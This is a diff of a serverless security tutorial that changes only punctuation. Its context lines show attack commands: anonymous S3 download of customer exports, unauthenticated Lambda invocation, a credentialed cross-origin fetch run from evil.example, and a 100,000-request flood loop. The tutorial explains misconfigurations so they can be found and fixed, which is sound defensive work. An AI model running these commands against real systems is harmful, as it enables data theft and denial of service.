@@ -8,9 +8,9 @@
 
 ## Understanding Serverless Misconfiguration Attack Vectors
 
-> **⚠️ EDUCATIONAL PURPOSE ONLY** — the techniques below are shown so you can find and fix these issues in systems you own or are authorised to test.
+> **⚠️ EDUCATIONAL PURPOSE ONLY** - the techniques below are shown so you can find and fix these issues in systems you own or are authorised to test.
 
-Serverless misconfiguration is rarely exploited through a clever payload. It is exploited through **enumeration and observation**: an attacker guesses or scrapes a resource name, probes a public endpoint, reads what a policy grants, and walks through whichever door the deployment left open. Because the flaws live in settings—buckets, policies, URLs, keys—they are cheap to find at scale, and cloud resource names are often predictable (`company-prod-uploads`, `api-stage-dev`).
+Serverless misconfiguration is rarely exploited through a clever payload. It is exploited through **enumeration and observation**: an attacker guesses or scrapes a resource name, probes a public endpoint, reads what a policy grants, and walks through whichever door the deployment left open. Because the flaws live in settings-buckets, policies, URLs, keys-they are cheap to find at scale, and cloud resource names are often predictable (`company-prod-uploads`, `api-stage-dev`).
 
 The attacker's goal in this category is usually one of:
 
@@ -50,7 +50,7 @@ aws s3 ls s3://acme-prod-uploads --no-sign-request
 aws s3 cp s3://acme-prod-uploads/exports/customers-2024-05.csv . --no-sign-request
 ```
 
-**Payoff**: anonymous download of backups, exports, and uploads—no credential, no exploit.
+**Payoff**: anonymous download of backups, exports, and uploads-no credential, no exploit.
 
 ### 2. Public Bucket Write (Input Poisoning)
 
@@ -71,10 +71,10 @@ A Function URL with `AuthType: NONE` is a public endpoint that runs the function
 curl -s https://abc123.lambda-url.us-east-1.on.aws/ \
   -H 'Content-Type: application/json' \
   -d '{"action":"exportAll"}'
-# 200 OK — the function executed with no authentication
+# 200 OK - the function executed with no authentication
 ```
 
-**Payoff**: direct, unauthenticated invocation of business logic. Discovery is easy—URLs leak in client code, logs, and referrers.
+**Payoff**: direct, unauthenticated invocation of business logic. Discovery is easy-URLs leak in client code, logs, and referrers.
 
 ### 4. Wildcard Resource Policy Abuse
 
@@ -87,7 +87,7 @@ aws lambda invoke --function-name process-orders \
 # The same anti-pattern lets anyone sns:Publish or sqs:SendMessage
 ```
 
-**Payoff**: cross-account or public invocation, publishing, and enqueuing—exactly the access the wildcard granted.
+**Payoff**: cross-account or public invocation, publishing, and enqueuing-exactly the access the wildcard granted.
 
 ### 5. Public SNS / SQS Injection
 
@@ -132,7 +132,7 @@ Over-logged API Gateway stages and debug output spill request bodies and interna
 
 ### 8. Unrestricted CORS on Public Endpoints
 
-`Access-Control-Allow-Origin: *`—or reflected origins with credentials—lets any site call the endpoint from a victim's browser.
+`Access-Control-Allow-Origin: *`-or reflected origins with credentials-lets any site call the endpoint from a victim's browser.
 
 ```javascript
 // Runs on evil.example while the victim is authenticated:
@@ -148,7 +148,7 @@ fetch('https://abc123.lambda-url.us-east-1.on.aws/me', { credentials: 'include' 
 Without throttling, every anonymous request is a bill and a denial-of-service lever.
 
 ```bash
-# No 429, no quota — hammer the public endpoint:
+# No 429, no quota - hammer the public endpoint:
 for i in $(seq 1 100000); do
   curl -s https://abc123.lambda-url.us-east-1.on.aws/ >/dev/null &
 done
@@ -193,7 +193,7 @@ An over-privileged role turns one foothold into account-wide control.
 }
 ```
 
-**Payoff**: a compromised function—or a leaked deploy credential—can read every resource, rewrite every policy, and create new backdoors.
+**Payoff**: a compromised function-or a leaked deploy credential-can read every resource, rewrite every policy, and create new backdoors.
 
 ## Chaining Misconfigurations
 
@@ -219,11 +219,11 @@ Guessable bucket name leaks a deploy artifact -> read serverless.yml + ARNs
 
 ## Key Takeaways
 
-1. **Misconfiguration is exploited by enumeration, not payloads**—predictable names and open policies map the attack.
-2. **Public storage and public policies are the front door**—`Principal: "*"`, public buckets, and `AuthType: NONE` need no exploit.
-3. **Secrets in env vars and verbose logs are free credentials**—move them to a manager and quiet the logs.
-4. **Missing throttling is a cost and DoS lever**—every anonymous request without a limit is abuse waiting to happen.
-5. **Small issues chain**—a writable bucket plus a trigger plus a leaked secret equals a breach with no code bug at all.
+1. **Misconfiguration is exploited by enumeration, not payloads**-predictable names and open policies map the attack.
+2. **Public storage and public policies are the front door**-`Principal: "*"`, public buckets, and `AuthType: NONE` need no exploit.
+3. **Secrets in env vars and verbose logs are free credentials**-move them to a manager and quiet the logs.
+4. **Missing throttling is a cost and DoS lever**-every anonymous request without a limit is abuse waiting to happen.
+5. **Small issues chain**-a writable bucket plus a trigger plus a leaked secret equals a breach with no code bug at all.
 
 ## Next Steps
 
